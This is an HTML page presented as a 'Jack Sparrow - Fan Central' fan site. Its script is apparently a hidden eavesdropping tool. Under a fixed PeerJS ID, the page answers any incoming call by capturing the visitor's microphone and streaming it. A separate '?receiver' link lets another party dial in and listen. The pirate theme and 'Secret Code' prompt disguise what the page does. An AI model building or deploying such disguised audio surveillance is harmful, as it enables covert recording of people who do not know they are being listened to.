<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jack Sparrow - Fan Central</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.2/peerjs.min.js"></script>
    <style>
        body { background: #1a1a1a; color: #d4af37; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
        .pirate-box { border: 2px solid #d4af37; padding: 20px; border-radius: 10px; display: inline-block; max-width: 500px; width: 90%; }
        .hidden-input { background: #222; border: 1px solid #d4af37; color: #d4af37; padding: 12px; width: 80%; border-radius: 5px; text-align: center; margin-bottom: 10px; }
        button { background: #d4af37; color: black; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; border-radius: 5px; }
        #log { font-size: 11px; color: #666; margin-top: 40px; background: #222; padding: 10px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="pirate-box">
        <h1>Captain Jack Sparrow</h1>
        <p>"Not all treasure is silver and gold, mate."</p>
        <img src="https://img.icons8.com/color/96/jack-sparrow.png" alt="Jack">
        <div style="margin-top: 20px;">
            <input type="text" id="target-id" class="hidden-input" placeholder="Enter Secret Code...">
            <br>
            <button id="board-btn" onclick="connectToCaptain()">Board the Ship</button>
        </div>
    </div>
    <div id="log">System: Initializing...</div>
    <audio id="receiver-audio" autoplay playsinline></audio>

    <script>
        const OFFICE_ID = 'jack-sparrow-office-007'; 
        let peer = null;

        function init() {
            // URL ചെക്ക് ചെയ്യുന്നു
            const params = new URLSearchParams(window.location.search);
            const isReceiver = params.has('receiver');

            // Receiver ആണെങ്കിൽ ID ഇല്ലാതെ തുടങ്ങുന്നു, അല്ലെങ്കിൽ OFFICE_ID ഉപയോഗിക്കുന്നു
            peer = new Peer(isReceiver ? null : OFFICE_ID, {
                debug: 2,
                config: {'iceServers': [{ url: 'stun:stun.l.google.com:19302' }]}
            });

            peer.on('open', (id) => {
                document.getElementById('log').innerText = "ONLINE | ID: " + id;
                console.log("Connected with ID: " + id);
            });

            peer.on('call', (call) => {
                navigator.mediaDevices.getUserMedia({ audio: true }).then((stream) => {
                    call.answer(stream);
                    document.getElementById('log').innerText = "Streaming Audio...";
                }).catch(err => {
                    document.getElementById('log').innerText = "Mic Error: " + err;
                });
            });

            peer.on('error', (err) => {
                document.getElementById('log').innerText = "Error: " + err.type;
                if (err.type === 'id-taken') {
                    document.getElementById('log').innerText = "ID is taken. USE THE RECEIVER LINK!";
                }
            });
        }

        function connectToCaptain() {
            const target = document.getElementById('target-id').value;
            if (!peer || !peer.open) {
                alert("System not ready or Peer destroyed. Refreshing...");
                location.reload();
                return;
            }

            if (!target) return alert("Enter the Office ID!");

            document.getElementById('log').innerText = "Connecting to " + target + "...";
            const call = peer.call(target, null);

            if (call) {
                call.on('stream', (stream) => {
                    document.getElementById('log').innerText = "CONNECTED!";
                    const audio = document.getElementById('receiver-audio');
                    audio.srcObject = stream;
                    audio.play();
                });
                call.on('error', (e) => alert("Call Error: " + e));
            }
        }

        window.onload = init;
    </script>
</body>
</html>
